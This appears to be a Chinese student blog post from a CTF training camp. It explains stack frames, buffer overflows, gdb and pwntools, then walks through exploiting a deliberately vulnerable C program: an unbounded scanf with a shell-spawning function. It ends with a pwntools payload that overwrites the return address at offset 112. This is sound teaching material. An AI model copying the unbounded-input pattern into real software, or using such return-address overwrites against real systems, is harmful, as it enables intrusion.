@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="梅翔学长今天帮助我们初次接触PWN。">
+<meta name="keywords" content="Bin,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="集训第七天：初次接触PWN">
+<meta property="og:url" content="http://yoursite.com/2018/07/07/pwn/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="梅翔学长今天帮助我们初次接触PWN。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.imgur.com/yvqaOsN.jpg">
+<meta property="og:image" content="https://i.imgur.com/sW1BdQM.png">
+<meta property="og:image" content="https://i.imgur.com/698Wfkj.png">
+<meta property="og:image" content="https://i.imgur.com/h572Jlm.png">
+<meta property="og:image" content="https://i.imgur.com/VXJfSgp.png">
+<meta property="og:image" content="https://i.imgur.com/DkbRIzG.png">
+<meta property="og:image" content="https://i.imgur.com/p2h3qrm.png">
+<meta property="og:image" content="https://i.imgur.com/Y0DQB83.png">
+<meta property="og:updated_time" content="2018-07-09T06:15:14.901Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="集训第七天：初次接触PWN">
+<meta name="twitter:description" content="梅翔学长今天帮助我们初次接触PWN。">
+<meta name="twitter:image" content="https://i.imgur.com/yvqaOsN.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>集训第七天：初次接触PWN</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Accueil</a></li>
+         
+          <li><a href="/about/">A propos</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projets</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/07/06/fourth/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Article précédent</span>
+      <span id="i-next" class="info" style="display:none;">Article suivant</span>
+      <span id="i-top" class="info" style="display:none;">Retour au début</span>
+      <span id="i-share" class="info" style="display:none;">Partager cette article</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/07/07/pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/07/07/pwn/&text=集训第七天：初次接触PWN"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/07/07/pwn/&is_video=false&description=集训第七天：初次接触PWN"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=集训第七天：初次接触PWN&body=Check out this article: http://yoursite.com/2018/07/07/pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/07/07/pwn/&name=集训第七天：初次接触PWN&description=&lt;p&gt;梅翔学长今天帮助我们初次接触PWN。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN底层基础的原理"><span class="toc-number">1.</span> <span class="toc-text">PWN底层基础的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈帧平衡"><span class="toc-number">1.1.</span> <span class="toc-text">栈帧平衡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调用函数（Call）"><span class="toc-number">1.2.</span> <span class="toc-text">调用函数（Call）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#返回值（Ret）"><span class="toc-number">1.3.</span> <span class="toc-text">返回值（Ret）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缓冲区溢出（Buffer-Overflow）"><span class="toc-number">2.</span> <span class="toc-text">缓冲区溢出（Buffer Overflow）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux下的Pwn常用命令"><span class="toc-number">3.</span> <span class="toc-text">Linux下的Pwn常用命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb基本命令"><span class="toc-number">4.</span> <span class="toc-text">gdb基本命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwntools基本函数"><span class="toc-number">5.</span> <span class="toc-text">Pwntools基本函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn的第一次练习"><span class="toc-number">6.</span> <span class="toc-text">Pwn的第一次练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#p1"><span class="toc-number">6.1.</span> <span class="toc-text">p1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#直接覆盖返回地址"><span class="toc-number">6.2.</span> <span class="toc-text">直接覆盖返回地址</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+    <a href="https://github.com/Shmilylbj"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png" alt="Fork me on GitHub"></a>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        集训第七天：初次接触PWN
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Hexo</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-07-07T15:59:59.000Z" itemprop="datePublished">2018-07-07</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Bin/">Bin</a>, <a class="tag-link" href="/tags/ctf/">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>梅翔学长今天帮助我们初次接触PWN。</p>
+<a id="more"></a>
+<h1 id="PWN底层基础的原理"><a href="#PWN底层基础的原理" class="headerlink" title="PWN底层基础的原理"></a>PWN底层基础的原理</h1><h2 id="栈帧平衡"><a href="#栈帧平衡" class="headerlink" title="栈帧平衡"></a>栈帧平衡</h2><p>一些基本内容：</p>
+<p>ESP：栈指针寄存器，存放一个指针，该指针永远指向系统栈最上面的栈帧的栈顶</p>
+<p>EBP：基址指针寄存器，该指针永远指向系统栈最上面的栈帧的底部<br>函数栈帧：ESP和EBP之间内存空间为当前栈帧</p>
+<p>在函数栈帧中一般包含以下几种信息：</p>
+<p>局部变量：为函数举报变量开辟的内存空间</p>
+<p>栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡得到）</p>
+<p>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置</p>
+<p>如何保证栈帧平衡：</p>
+<p>PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值</p>
+<p>MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧</p>
+<p>XXXXXX // 函数中间部分</p>
+<p>MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间</p>
+<p>POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧</p>
+<p><img src="https://i.imgur.com/yvqaOsN.jpg" alt="">调用函数后，会先保留旧的栈帧并建立新的栈帧（这里栈底在上，栈顶在下）</p>
+<p>函数返回的步骤：</p>
+<p>1：保存返回值，通常将函数的返回值保存在寄存器EAX中。 </p>
+<p>2：弹出当前帧，恢复上一个栈帧。具体包括：<1> 在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间。<2> 将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复出上一个栈帧。<3> 将函数返回地址弹给EIP寄存器。</3></2></1></p>
+<p>3：跳转：按照函数返回地址跳回母函数中继续执行。</p>
+<p><img src="https://i.imgur.com/sW1BdQM.png" alt="">每次调用一个函数都会新增一个栈帧（这里栈底在下，栈顶在上）</p>
+<p>PS：栈的守护天使——GS，也称作Stack Canary/Cookie</p>
+<h2 id="调用函数（Call）"><a href="#调用函数（Call）" class="headerlink" title="调用函数（Call）"></a>调用函数（Call）</h2><p>CALL可以化为两部分，即Push retaddr + Jump。先讲函数返回的地址入栈，再跳转到函数执行的位置处。</p>
+<h2 id="返回值（Ret）"><a href="#返回值（Ret）" class="headerlink" title="返回值（Ret）"></a>返回值（Ret）</h2><p>RET也可以转化为两部分，即Pop retaddr + Jump。先是把返回值的地址出栈，再跳转回原本调用函数处。</p>
+<h1 id="缓冲区溢出（Buffer-Overflow）"><a href="#缓冲区溢出（Buffer-Overflow）" class="headerlink" title="缓冲区溢出（Buffer Overflow）"></a>缓冲区溢出（Buffer Overflow）</h1><p>缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。</p>
+<p>尤其是C语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C语言中的C标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</p>
+<h1 id="Linux下的Pwn常用命令"><a href="#Linux下的Pwn常用命令" class="headerlink" title="Linux下的Pwn常用命令"></a>Linux下的Pwn常用命令</h1><p>cd：进入文件夹</p>
+<p>ls：列出当前目录下的所有文件</p>
+<p>mkdir：<br>创建文件夹</p>
+<p>pwd：<br>显示当前所在目录</p>
+<p>chmod：<br>改变文件使用权限</p>
+<p>objdump：<br>查看目标文件或者可执行的目标文件的构成</p>
+<p>gdb：<br>使用gdb进行调试</p>
+<p>checksec：<br>检测二进制的保护机制是否开启（peda中的命令）</p>
+<h1 id="gdb基本命令"><a href="#gdb基本命令" class="headerlink" title="gdb基本命令"></a>gdb基本命令</h1><p>start：<br>开始调试</p>
+<p>pattc：<br>生成规律字符串</p>
+<p>patto：<br>查找字符串</p>
+<p>q：<br>退出</p>
+<p>n：<br>执行一行源代码但不进入函数内部</p>
+<p>ni：<br>执行一行汇编代码但不进入函数内部</p>
+<p>s：<br>执行一行源代码而且进入函数内部</p>
+<p>si：<br>执行一行汇编代码而且进入函数内部</p>
+<p>c：<br>继续执行到下一个断点</p>
+<p>b：<br>下断点</p>
+<p>stack：<br>显示栈信息</p>
+<p>x：<br>按十六进制格式显示内存数据</p>
+<p>r：<br>运行代码</p>
+<h1 id="Pwntools基本函数"><a href="#Pwntools基本函数" class="headerlink" title="Pwntools基本函数"></a>Pwntools基本函数</h1><p>sendline()：<br>向目标发送一行字符串</p>
+<p>interactive()：<br>实现和程序之间的交互</p>
+<p>remote()：<br>远程连接</p>
+<p>context()：<br>设置运行时变量</p>
+<p>p32()/p64()：<br>把整数转化为32/64位的字符串</p>
+<p>u32()/u64()：<br>把32/64位字符串转化成整数</p>
+<p>asm()/disasm()：<br>快速汇编/反汇编</p>
+<p>log()：<br>输出消息</p>
+<h1 id="Pwn的第一次练习"><a href="#Pwn的第一次练习" class="headerlink" title="Pwn的第一次练习"></a>Pwn的第一次练习</h1><h2 id="p1"><a href="#p1" class="headerlink" title="p1"></a>p1</h2><p>程序源码：</p>
+<p> #include &lt;stdio.h&gt;</p>
+<p> #include &lt;stdlib.h&gt;</p>
+<p> #include &lt;unistd.h&gt;</p>
+<p>void vmd()</p>
+<p>{</p>
+<pre><code>system(&quot;sh&quot;);
+</code></pre><p>}</p>
+<p>void A()</p>
+<p>{</p>
+<pre><code>char a[100];
+scanf(&quot;%s&quot;,a);
+return;
+</code></pre><p>}</p>
+<p>int main(){</p>
+<pre><code>A();
+</code></pre><p>}</p>
+<p>输入gcc p1.c -o p1 -m32，用来编译32位的程序。</p>
+<h2 id="直接覆盖返回地址"><a href="#直接覆盖返回地址" class="headerlink" title="直接覆盖返回地址"></a>直接覆盖返回地址</h2><p>根据源文件可以判断该程序调用A()函数时，在scanf中没有对字符串的长度做限制，即存在缓冲区溢出。</p>
+<p>根据源码，本题的思路应该为通过缓冲区溢出，将RET处的地址修改为cmd()函数的地址，直接跳转到该函数后getshell。故先通过objdump命令寻找到cmd函数的地址</p>
+<p><img src="https://i.imgur.com/698Wfkj.png" alt="">找到cmd函数的地址</p>
+<p>然后输入gdb p1进入gdb调试界面。start开始调试程序。</p>
+<p><img src="https://i.imgur.com/h572Jlm.png" alt=""></p>
+<p>自上而下分别为寄存器、代码段、栈段</p>
+<p><img src="https://i.imgur.com/VXJfSgp.png" alt=""></p>
+<p>单步进入A()</p>
+<p><img src="https://i.imgur.com/DkbRIzG.png" alt=""></p>
+<p>单步执行到scanf后，用pattc命令构造出一段较长的字符</p>
+<p><img src="https://i.imgur.com/p2h3qrm.png" alt=""></p>
+<p>继续单步执行，程序报错返回RET处的地址</p>
+<p><img src="https://i.imgur.com/Y0DQB83.png" alt="">使用patto命令查找得到偏移量</p>
+<p>已知偏移量为112后，容易知道可以直接通过溢出在RET处覆盖原本的地址，直接跳至cmd()函数处。</p>
+<p>payload如下：</p>
+<p>from pwn import *</p>
+<p>payload = “A” * 112 + “\x6b\x84\x04\x08”</p>
+<p>p = process(“./p1”)</p>
+<p>p.sendline(payload)</p>
+<p>p.interactive()</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Accueil</a></li>
+         
+          <li><a href="/about/">A propos</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projets</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN底层基础的原理"><span class="toc-number">1.</span> <span class="toc-text">PWN底层基础的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈帧平衡"><span class="toc-number">1.1.</span> <span class="toc-text">栈帧平衡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调用函数（Call）"><span class="toc-number">1.2.</span> <span class="toc-text">调用函数（Call）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#返回值（Ret）"><span class="toc-number">1.3.</span> <span class="toc-text">返回值（Ret）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缓冲区溢出（Buffer-Overflow）"><span class="toc-number">2.</span> <span class="toc-text">缓冲区溢出（Buffer Overflow）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux下的Pwn常用命令"><span class="toc-number">3.</span> <span class="toc-text">Linux下的Pwn常用命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb基本命令"><span class="toc-number">4.</span> <span class="toc-text">gdb基本命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwntools基本函数"><span class="toc-number">5.</span> <span class="toc-text">Pwntools基本函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn的第一次练习"><span class="toc-number">6.</span> <span class="toc-text">Pwn的第一次练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#p1"><span class="toc-number">6.1.</span> <span class="toc-text">p1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#直接覆盖返回地址"><span class="toc-number">6.2.</span> <span class="toc-text">直接覆盖返回地址</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/07/07/pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/07/07/pwn/&text=集训第七天：初次接触PWN"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/07/07/pwn/&is_video=false&description=集训第七天：初次接触PWN"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=集训第七天：初次接触PWN&body=Check out this article: http://yoursite.com/2018/07/07/pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/07/07/pwn/&title=集训第七天：初次接触PWN"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/07/07/pwn/&name=集训第七天：初次接触PWN&description=&lt;p&gt;梅翔学长今天帮助我们初次接触PWN。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> Table des matière</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Partager</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Début</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    Copyright &copy; 2018 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Accueil</a></li>
+         
+          <li><a href="/about/">A propos</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projets</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
